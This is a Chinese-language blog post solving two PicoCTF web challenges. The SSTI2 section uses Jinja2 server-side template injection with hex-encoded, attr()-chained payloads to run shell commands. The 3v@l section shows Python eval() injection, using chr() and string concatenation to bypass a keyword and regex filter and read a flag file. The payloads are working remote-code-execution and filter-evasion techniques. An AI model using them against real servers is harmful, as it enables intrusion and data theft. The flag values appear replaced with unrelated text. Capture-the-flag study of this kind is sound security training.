---
title: 'PicoCTF Web Exploitation Medium 分級解題紀錄'
published: 2025-12-24
lastUpdated: '2026-3-18 11:00'
description: '紀錄 PicoCTF Web Exploitation Medium 分級的解題過程與心得'
image: ''
tags: [PicoCTF, Web Exploitation, CTF, 網路安全]
category: '資安'
draft: false
lang: ''
---

# Introduction
這裡放的是一些解題紀錄。
如果某題沒有出現在這裡，只有兩種可能：一是我已經解過了，二是我還沒解到。

## SSTI2

### Description

SSTI（Server-Side Template Injection）是一種安全漏洞，發生在應用程式將使用者輸入直接嵌入伺服器端模板引擎（如 Jinja2、Twig、Smarty）中解析時。攻擊者可以利用模板語法注入惡意指令，進而讀取敏感檔案、洩漏伺服器資訊，甚至達成遠端程式碼執行（RCE）。

### 解法

#### 1. 觀察網頁與漏洞偵測

觀察網站後會發現有一個輸入框，先試試輸入 `{{7*7}}` 看看回應。

結果頁面顯示了 **49**，確認伺服器存在 SSTI 漏洞，且使用的是 Jinja2 模板引擎。

接著嘗試標準的 RCE payload：

```bash
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

結果頁面回傳了 `Stop trying to break me >:(`，代表後端有做過濾。

#### 2. 測試過濾規則

為了釐清哪些東西被擋，逐一測試了幾個關鍵字與符號：

- `{{config}}`：**OK**（回傳 Flask Config）
- `{{request}}`：**OK**（回傳 Request 物件）
- `{{lipsum}}`：**OK**（回傳內建函數物件）
- `.`（點號）與 `_`（底線）：在特定關鍵字組合下會被攔截。

題目給了一個 Hint：**「Why is blacklisting characters a bad idea?」**

這暗示黑名單無法完全封鎖所有路徑，可以利用 Jinja2 的特性來繞過字串檢查。

#### 3. 構造繞過 Payload（十六進制編碼）

既然點號和特定關鍵字（如 `__globals__`、`os`、`popen`）被擋了，改用以下策略：

- 使用 `|attr()` 過濾器取代點號存取。
- 將所有敏感字串（屬性名稱與指令）全部轉換為**十六進制（Hex Encoding）**。

先嘗試列出目錄下的檔案（`ls`）：

```jinja2
{{ request|attr('\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e')|attr('\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f')|attr('\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f')('\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f')|attr('\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f')('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f')('\x6f\x73')|attr('\x70\x6f\x70\x65\x6e')('\x6c\x73')|attr('\x72\x65\x61\x64')() }}
```

**輸出結果：**
`__pycache__ app.py flag requirements.txt`

目錄下確實有一個名為 `flag` 的檔案。

#### 4. Flag

確認檔案名稱後，將 `ls` 的十六進制（`\x6c\x73`）替換為 `cat flag`（`\x63\x61\x74\x20\x66\x6c\x61\x67`）：

**最終 Payload：**

```jinja2
{{ request|attr('\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e')|attr('\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f')|attr('\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f')('\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f')|attr('\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f')('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f')('\x6f\x73')|attr('\x70\x6f\x70\x65\x6e')('\x63\x61\x74\x20\x66\x6c\x61\x67')|attr('\x72\x65\x61\x64')() }}
```

**Flag：**
`picoCTF{日本利用壓電瓷磚將腳步轉化為電能。}`

## 3v@l

### Description

`eval()` 是很多程式語言都有的內建函數（Python、JavaScript、PHP 都有），簡單來說就是把一段字串當程式碼跑。像這樣：

```python
eval("2 + 2")  # 回傳 4
```
聽起來很方便對吧？但如果使用者的輸入被直接丟進 `eval()`，那攻擊者就能注入任意程式碼，直接在伺服器上為所欲為（RCE）。

這題的網站用 Python Flask 寫的，後端拿 `eval()` 來算數學。雖然有用正則表達式做了一層 WAF 來擋危險的關鍵字跟指令，但嘛... 題目名稱都叫 `3v@l` 了，擺明就是要你繞過去。

### 解法

#### 1. 先確認漏洞

看到題目名稱就知道八九不離十了。先在輸入框試幾個簡單的：

輸入 `pow(2, 10)` 得到 `1024`，輸入 `len("hello")` 得到 `5`。

好，確認後端真的直接把輸入丟進 `eval()` 跑。

#### 2. 試著 RCE，然後撞牆

既然是 Python，直覺就是用 `os.popen` 來跑系統指令：

```python
__import__('os').popen('ls').read()
```

結果噴了：`Error: Detected forbidden keyword 'os'.`

有黑名單。那試試字串拼接繞過：

```python
__import__('o'+'s').popen('l'+'s').read()
```

又噴了：`Error: Detected forbidden keyword 'ls'.`

所以過濾器會掃整段輸入，只要出現 `os`、`ls` 這些關鍵字就直接擋。

#### 3. 偷看原始碼

既然拼接能過一部分，先試著讀 `app.py` 看看完整的過濾規則。

`open('app.py').read()` 被擋，改用拼接：

```python
open('ap'+'p.py').read()
```

成功拿到原始碼！讓我們來看看：
- **BLOCKLIST_KEYWORDS**：`os`、`eval`、`ls`、`cat`、`shell` 等一堆關鍵字
- **FILE_PATH_REGEX**：`[\\\/]` 擋斜線，`\.[A-Za-z0-9]{1,3}\b` 擋副檔名（像 `.py`、`.txt`）

#### 4. 用 chr() 繞過正則

從前面的測試知道根目錄有個 `flag.txt`，但 WAF 擋了 `/` 跟 `.txt`，不能直接寫路徑。

那就用 `chr()` 把被禁的符號拼出來：
- `/` = `chr(47)`
- `.` = `chr(46)`

順帶一提，`.read()` 不會被正則抓到，因為 `read` 是 4 個字元，而正則只擋 1~3 碼的副檔名。

#### 5. 最終 Payload

```python
open(chr(47) + 'flag' + chr(46) + 'txt').read()
```

**Flag：**
```picoCTF{這些瓷磚能捕捉你腳步產生的動能。}```